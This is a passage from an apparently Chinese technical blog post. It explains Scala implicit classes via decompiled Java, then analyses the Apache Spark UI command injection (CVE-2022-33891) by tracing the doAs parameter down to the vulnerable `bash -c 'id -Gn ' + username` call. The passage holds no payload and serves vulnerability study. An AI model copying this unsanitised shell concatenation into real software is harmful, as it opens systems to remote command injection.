</span></span><span style="display:flex;"><span>          loop<span style="color:#f92672">(</span>c <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      loop<span style="color:#f92672">(</span>i<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>在<code>main</code>方法中使用了一个不太常用的方法<code>4.times</code>，如此偏门的语法是如何实现的呢？这就是<code>Scala</code>隐式类的魔法。 在<code>Scala</code>中没有<code>Java</code>中类似<code>int</code> 这一类基本数据类型，所有数据类型均是包装类型，即<code>4</code>这个整型字面量乃是<code>Int</code>类型的实例对象，那么<code>4.times()</code>就表示在<code>Int</code>的实例对象上调用<code>times</code>方法。在进行方法调用时，首先会搜索<code>Int</code>类是否定义了<code>times</code>方法，若没有则在当前作用域中搜索是否存在<code>Int</code>类型的隐式类型转换，若存在，则在目标类型中搜索<code>times</code>方法进行调用。 将上述代码的字节码反编译为<code>Java</code>代码后得到：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//decompiled from ImplicitClass.class</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ImplicitClass</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> intWithTimes <span style="color:#a6e22e">intWithTimes</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> i) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> ImplicitClass$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">intWithTimes</span>(i);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      ImplicitClass$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">main</span>(args);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">intWithTimes</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">times</span>(<span style="color:#66d9ef">final</span> Function0 f) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">loop$1</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">i</span>, f);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loop$1</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> c, <span style="color:#66d9ef">final</span> Function0 f$1) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">while</span>(c <span style="color:#f92672">&gt;</span> 0) {
</span></span><span style="display:flex;"><span>            f$1.<span style="color:#a6e22e">apply</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">--</span>c;
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         BoxedUnit var10000 <span style="color:#f92672">=</span> BoxedUnit.<span style="color:#a6e22e">UNIT</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">intWithTimes</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> i) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> i;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from ImplicitClass$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ImplicitClass$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> ImplicitClass$ MODULE$;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> ImplicitClass$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">intWithTimes</span>(4).<span style="color:#a6e22e">times</span>(() <span style="color:#f92672">-&gt;</span> {
</span></span><span style="display:flex;"><span>         .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span>      });
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> ImplicitClass.<span style="color:#a6e22e">intWithTimes</span> <span style="color:#a6e22e">intWithTimes</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> i) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> ImplicitClass.<span style="color:#a6e22e">intWithTimes</span>(i);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">ImplicitClass$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// $FF: synthetic method</span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">$deserializeLambda$</span>(SerializedLambda var0) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> var0.<span style="color:#a6e22e">lambdaDeserialize</span><span style="color:#f92672">&lt;</span>invokedynamic<span style="color:#f92672">&gt;</span>(var0);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可以看到调用逻辑与前两小节隐式参数与隐式方法如出一辙。</p>
<h2 id="三案例分析">三、案例分析<a hidden class="anchor" aria-hidden="true" href="#三案例分析">#</a></h2>
<h3 id="31-apache-spark-ui-远程命令注入cve-2022-33891">3.1 Apache Spark UI 远程命令注入（CVE-2022-33891）<a hidden class="anchor" aria-hidden="true" href="#31-apache-spark-ui-远程命令注入cve-2022-33891">#</a></h3>
<p><code>Apache Spark UI</code> 曾经被披露存在远程命令注入漏洞，该漏洞源于程序对用户权限模拟用户名参数处理不当。该漏洞较为简单，便直接在代码中通过注释进行解释说明。</p>
<p><em>HttpSecurityFilter</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> doFilter<span style="color:#f92672">(</span>req<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">ServletRequest</span><span style="color:#f92672">,</span> res<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">ServletResponse</span><span style="color:#f92672">,</span> chain<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">FilterChain</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> hreq <span style="color:#66d9ef">=</span> req<span style="color:#f92672">.</span>asInstanceOf<span style="color:#f92672">[</span><span style="color:#66d9ef">HttpServletRequest</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> hres <span style="color:#66d9ef">=</span> res<span style="color:#f92672">.</span>asInstanceOf<span style="color:#f92672">[</span><span style="color:#66d9ef">HttpServletResponse</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    hres<span style="color:#f92672">.</span>setHeader<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Cache-Control&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;no-cache, no-store, must-revalidate&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 获取当前登录用户名
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> requestUser <span style="color:#66d9ef">=</span> hreq<span style="color:#f92672">.</span>getRemoteUser<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The doAs parameter allows proxy servers (e.g. Knox) to impersonate other users. For
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// that to be allowed, the authenticated user needs to be an admin.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 获取doAs参数的值
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> effectiveUser <span style="color:#66d9ef">=</span> <span style="color:#a6e22e">Option</span><span style="color:#f92672">(</span>hreq<span style="color:#f92672">.</span>getParameter<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;doAs&#34;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">.</span>map <span style="color:#f92672">{</span> proxy <span style="color:#66d9ef">=&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 检查doAs是否与当前登录用户相同，如不相同且当前用户不具有管理员权限则退出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>requestUser <span style="color:#f92672">!=</span> proxy <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>securityMgr<span style="color:#f92672">.</span>checkAdminPermissions<span style="color:#f92672">(</span>requestUser<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          hres<span style="color:#f92672">.</span>sendError<span style="color:#f92672">(</span><span style="color:#a6e22e">HttpServletResponse</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SC_FORBIDDEN</span><span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">s&#34;User </span><span style="color:#e6db74">$requestUser</span><span style="color:#e6db74"> is not allowed to impersonate others.&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        proxy
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">.</span>getOrElse<span style="color:#f92672">(</span>requestUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 检查代理用户是否具有UIView权限  入口
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>securityMgr<span style="color:#f92672">.</span>checkUIViewPermissions<span style="color:#f92672">(</span>effectiveUser<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      hres<span style="color:#f92672">.</span>sendError<span style="color:#f92672">(</span><span style="color:#a6e22e">HttpServletResponse</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SC_FORBIDDEN</span><span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">s&#34;User </span><span style="color:#e6db74">$effectiveUser</span><span style="color:#e6db74"> is not authorized to access this page.&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>*SecurityManager#*checkUIViewPermissions</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> checkUIViewPermissions<span style="color:#f92672">(</span>user<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    logDebug<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;user=&#34;</span> <span style="color:#f92672">+</span> user <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; aclsEnabled=&#34;</span> <span style="color:#f92672">+</span> aclsEnabled<span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; viewAcls=&#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>      viewAcls<span style="color:#f92672">.</span>mkString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; viewAclsGroups=&#34;</span> <span style="color:#f92672">+</span> viewAclsGroups<span style="color:#f92672">.</span>mkString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 用户acl权限控制
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    isUserInACL<span style="color:#f92672">(</span>user<span style="color:#f92672">,</span> viewAcls<span style="color:#f92672">,</span> viewAclsGroups<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>*SecurityManager#*isUserInACL</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> isUserInACL<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>      user<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>      aclUsers<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Set</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">],</span>
</span></span><span style="display:flex;"><span>      aclGroups<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Set</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>user <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">!</span>aclsEnabled<span style="color:#f92672">()</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        aclUsers<span style="color:#f92672">.</span>contains<span style="color:#f92672">(</span><span style="color:#a6e22e">WILDCARD_ACL</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        aclUsers<span style="color:#f92672">.</span>contains<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        aclGroups<span style="color:#f92672">.</span>contains<span style="color:#f92672">(</span><span style="color:#a6e22e">WILDCARD_ACL</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 获取当前用户属组
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">val</span> userGroups <span style="color:#66d9ef">=</span> <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span>getCurrentUserGroups<span style="color:#f92672">(</span>sparkConf<span style="color:#f92672">,</span> user<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      logDebug<span style="color:#f92672">(</span><span style="color:#e6db74">s&#34;user </span><span style="color:#e6db74">$user</span><span style="color:#e6db74"> is in groups </span><span style="color:#e6db74">${</span>userGroups<span style="color:#f92672">.</span>mkString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">)</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      aclGroups<span style="color:#f92672">.</span>exists<span style="color:#f92672">(</span>userGroups<span style="color:#f92672">.</span>contains<span style="color:#f92672">(</span><span style="color:#66d9ef">_</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><em>Utils#getCurrentUserGroups</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> getCurrentUserGroups<span style="color:#f92672">(</span>sparkConf<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">SparkConf</span><span style="color:#f92672">,</span> username<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Set</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 获取provider，默认provider为&#34;org.apache.spark.security.ShellBasedGroupsMappingProvider
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//val USER_GROUPS_MAPPING = ConfigBuilder(&#34;spark.user.groups.mapping&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//.version(&#34;2.0.0&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//.stringConf
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//.createWithDefault(&#34;org.apache.spark.security.ShellBasedGroupsMappingProvider&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> groupProviderClassName <span style="color:#66d9ef">=</span> sparkConf<span style="color:#f92672">.</span>get<span style="color:#f92672">(</span><span style="color:#a6e22e">USER_GROUPS_MAPPING</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>groupProviderClassName <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">val</span> groupMappingServiceProvider <span style="color:#66d9ef">=</span> classForName<span style="color:#f92672">(</span>groupProviderClassName<span style="color:#f92672">).</span>
</span></span><span style="display:flex;"><span>          getConstructor<span style="color:#f92672">().</span>newInstance<span style="color:#f92672">().</span>
</span></span><span style="display:flex;"><span>          asInstanceOf<span style="color:#f92672">[</span><span style="color:#66d9ef">org.apache.spark.security.GroupMappingServiceProvider</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// 获取属组
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">val</span> currentUserGroups <span style="color:#66d9ef">=</span> groupMappingServiceProvider<span style="color:#f92672">.</span>getGroups<span style="color:#f92672">(</span>username<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> currentUserGroups
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> e<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Exception</span> <span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>          logError<span style="color:#f92672">(</span>log<span style="color:#e6db74">&#34;Error getting groups for user=${MDC(USER_NAME, username)}&#34;</span><span style="color:#f92672">,</span> e<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">EMPTY_USER_GROUPS</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><em>ShellBasedGroupsMappingProvider#getGroups</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> getGroups<span style="color:#f92672">(</span>username<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Set</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 获取属组
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> userGroups <span style="color:#66d9ef">=</span> getUnixGroups<span style="color:#f92672">(</span>username<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    logDebug<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;User: &#34;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; Groups: &#34;</span> <span style="color:#f92672">+</span> userGroups<span style="color:#f92672">.</span>mkString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>    userGroups
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>ShellBasedGroupsMappingProvider#getUnixGroups</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> getUnixGroups<span style="color:#f92672">(</span>username<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Set</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 直接进行参数拼接，且使用了bash -c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> cmdSeq <span style="color:#66d9ef">=</span> <span style="color:#a6e22e">Seq</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;id -Gn &#34;</span> <span style="color:#f92672">+</span> username<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// we need to get rid of the trailing &#34;\n&#34; from the result of command execution
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span>executeAndGetOutput<span style="color:#f92672">(</span>cmdSeq<span style="color:#f92672">).</span>stripLineEnd<span style="color:#f92672">.</span>split<span style="color:#f92672">(</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">).</span>toSet
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><em>Utils#executeAndGetOutput</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> executeAndGetOutput<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>      command<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Seq</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">],</span>
</span></span><span style="display:flex;"><span>      workingDir<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">File</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">),</span>
</span></span><span style="display:flex;"><span>      extraEnvironment<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Map</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span>, <span style="color:#66d9ef">String</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#a6e22e">Map</span><span style="color:#f92672">.</span>empty<span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>      redirectStderr<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 执行命令
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> process <span style="color:#66d9ef">=</span> executeCommand<span style="color:#f92672">(</span>command<span style="color:#f92672">,</span> workingDir<span style="color:#f92672">,</span> extraEnvironment<span style="color:#f92672">,</span> redirectStderr<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> output <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">StringBuilder</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> threadName <span style="color:#66d9ef">=</span> <span style="color:#e6db74">&#34;read stdout for &#34;</span> <span style="color:#f92672">+</span> command<span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> appendToOutput<span style="color:#f92672">(</span>s<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> output<span style="color:#f92672">.</span>append<span style="color:#f92672">(</span>s<span style="color:#f92672">).</span>append<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> stdoutThread <span style="color:#66d9ef">=</span> processStreamByLine<span style="color:#f92672">(</span>threadName<span style="color:#f92672">,</span> process<span style="color:#f92672">.</span>getInputStream<span style="color:#f92672">,</span> appendToOutput<span style="color:#f92672">)</span>
